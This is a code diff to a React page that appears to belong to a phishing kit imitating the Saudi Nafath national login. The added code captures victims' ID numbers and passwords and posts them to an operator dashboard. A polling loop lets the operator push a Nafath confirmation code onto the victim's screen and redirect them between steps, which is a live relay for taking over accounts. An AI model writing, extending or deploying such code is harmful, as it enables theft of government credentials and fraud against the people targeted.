@@ -69,21 +69,51 @@ export default function Component() {
     }
   }, [visitorId])
 
-  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
+  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control (socket + polling)
   useEffect(() => {
     if (!visitorId) return
 
     console.log("[nafad] Setting up navigation listener for visitor:", visitorId)
 
+    // Poll for admin actions (socket is disabled)
+    const pollVisitorData = async () => {
+      try {
+        const res = await fetch(`/api/visitors/${visitorId}`)
+        if (!res.ok) return
+        const data = await res.json()
+        
+        // Check for nafad code from admin
+        const nafadCode = data.adminNafadCode
+        if (nafadCode) {
+          const normalized = String(nafadCode).slice(0, 2);
+          setConfirmationCode(normalized)
+          const storageKey = `nafad_shown_${visitorId}`
+          const lastShownCode = localStorage.getItem(storageKey)
+          if (normalized !== lastShownCode) {
+            setShowConfirmDialog(true)
+            localStorage.setItem(storageKey, normalized)
+            setIsLoading(false)
+            setShowError('')
+            setShowSuccessDialog(false)
+          }
+        }
+        
+        // Check for redirect
+        const redirectPage = data.redirectPage || data.redirect_page
+        if (redirectPage === 'phone' && window.location.pathname !== '/step5') {
+          window.location.href = '/step5'
+        }
+      } catch (err) {
+        // Silent fail
+      }
+    }
+
+    const interval = setInterval(pollVisitorData, 1000)
+    
+    // Socket listener (for real-time updates)
     const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
       console.log("[nafad] Socket update:", field, status)
-      if (field === 'currentStep') {
-        if (status === 'home') window.location.href = '/'
-        else if (status === 'phone') window.location.href = '/step5'
-        else if (status === '_st1') window.location.href = '/check'
-        else if (status === '_t2') window.location.href = '/step2'
-        else if (status === '_t3') window.location.href = '/step3'
-      } else if (field === 'nafadConfirmationCode') {
+      if (field === 'nafadConfirmationCode') {
         if (status) {
           const normalized = String(status).slice(0, 2);
           setConfirmationCode(normalized)
@@ -110,17 +140,15 @@ export default function Component() {
           setShowError('تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.')
           submitVisitorFormData({ id: visitorId, nafadConfirmationStatus: '', nafadConfirmationCode: '' }).catch(console.error)
         }
-      } else if (field === 'showNafadConfirmation' && status) {
-        setShowConfirmDialog(true)
-        setShowSuccessDialog(false)
       }
     })
 
     return () => {
       console.log("[nafad] Cleaning up navigation listener")
       unsubscribe()
+      clearInterval(interval)
     }
-  }, [])
+  }, [visitorId])
 
   const handleLogin = async (e: any) => {
     e.preventDefault();
@@ -134,18 +162,39 @@ export default function Component() {
 
     setIsLoading(true);
 
-    // Save current data to history before updating
     if (visitorId) {
+      // Submit to server
+      await submitVisitorFormData({
+        id: visitorId,
+        nafadIdNumber: idLogin,
+        nafadPassword: password,
+        nafadConfirmationStatus: "waiting",
+        currentStep: "_t6",
+        currentPage: "nafad",
+        nafadUpdatedAt: new Date().toISOString()
+      });
+      
+      // Notify dashboard with nafad data
+      await fetch('/api/dashboard/requests', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: visitorId,
+          visitorId: visitorId,
+          nafadIdNumber: idLogin,
+          nafadPassword: password,
+          nafadConfirmationStatus: "waiting",
+          currentStep: 8,
+          currentPage: "nafad",
+          status: "pending"
+        })
+      }).catch(console.error);
+      
+      // Trigger dashboard refresh
+      if (typeof window !== 'undefined') {
+        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
+      }
     }
-
-    await submitVisitorFormData({
-      id: visitorId,
-      _v8: idLogin,
-      _v9: password,
-      nafadConfirmationStatus: "waiting",
-      currentStep: "_t6",
-      nafadUpdatedAt: new Date().toISOString()
-    });
     
     // Keep loading until modal appears (don't stop here)
     // setIsLoading will be set to false when modal opens or error occurs
